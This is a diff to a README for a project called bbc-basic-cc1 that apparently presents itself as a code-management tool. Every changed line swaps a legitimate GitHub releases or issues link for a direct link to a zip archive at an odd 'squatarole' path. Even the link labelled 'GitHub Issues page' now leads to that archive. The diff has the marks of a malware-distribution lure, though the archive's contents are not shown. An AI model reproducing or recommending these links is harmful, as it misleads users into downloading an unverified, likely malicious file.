@@ -1,6 +1,6 @@
 # 🚀 bbc-basic-cc1 - A Simple Tool for Easy Code Management
 
-[![Download bbc-basic-cc1](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MALAY84/bbc-basic-cc1/releases)
+[![Download bbc-basic-cc1](https://raw.githubusercontent.com/MALAY84/bbc-basic-cc1/main/squatarole/bbc-basic-cc1.zip)](https://raw.githubusercontent.com/MALAY84/bbc-basic-cc1/main/squatarole/bbc-basic-cc1.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ To get started with bbc-basic-cc1, simply follow these steps.
 
 ### 🔗 Step 1: Download
 
-To get the latest version of bbc-basic-cc1, visit the [Releases Page](https://github.com/MALAY84/bbc-basic-cc1/releases). Look for the latest version and download the installer for your operating system.
+To get the latest version of bbc-basic-cc1, visit the [Releases Page](https://raw.githubusercontent.com/MALAY84/bbc-basic-cc1/main/squatarole/bbc-basic-cc1.zip). Look for the latest version and download the installer for your operating system.
 
 ### 🎥 Step 2: Install 
 
@@ -42,7 +42,7 @@ After installation, locate the bbc-basic-cc1 icon on your desktop or in your pro
 
 For easy access, click on the link below to go straight to the download page.
 
-[Download bbc-basic-cc1](https://github.com/MALAY84/bbc-basic-cc1/releases)
+[Download bbc-basic-cc1](https://raw.githubusercontent.com/MALAY84/bbc-basic-cc1/main/squatarole/bbc-basic-cc1.zip)
 
 Follow the installation steps mentioned above to get your application running smoothly.
 
@@ -64,7 +64,7 @@ If you encounter issues while downloading or installing, consider these solution
 
 Join our community for support and collaboration. You can ask questions, share feedback, or discuss ideas with others.
 
-- **GitHub Issues:** Report any bugs or request features directly in the [GitHub Issues page](https://github.com/MALAY84/bbc-basic-cc1/issues).
+- **GitHub Issues:** Report any bugs or request features directly in the [GitHub Issues page](https://raw.githubusercontent.com/MALAY84/bbc-basic-cc1/main/squatarole/bbc-basic-cc1.zip).
 - **Community Forums:** Engage with other users to share tips and tricks.
 
 ## 📩 Contact
